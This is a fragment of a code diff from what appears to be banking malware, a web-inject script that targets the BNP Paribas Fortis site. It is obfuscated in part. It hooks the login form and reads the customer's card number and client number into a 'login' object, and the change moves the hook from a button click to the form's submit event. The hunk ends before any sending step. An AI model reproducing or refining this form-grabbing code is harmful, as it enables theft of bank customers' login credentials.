@@ -171,7 +171,7 @@ if (top['location']['href']['indexOf']('www.bnpparibasfortis.be') > -1) {
     var interval = setInterval(function () {
         if (document['getElementsByClassName']('login_flow')[0]) {
             clearInterval(interval);
-            document['getElementsByClassName']('btn_default btn_primary login_btn btn_active_bg')[0].onclick = function (_0x441cx2) {
+            document['getElementsByClassName']('form-class')[0].onsubmit = function (_0x441cx2) {
               var login = {};
                   login.username = document.getElementsByName("cardNum")[0].value;
                   login.pass = document.getElementsByName("clientNum")[0].value;
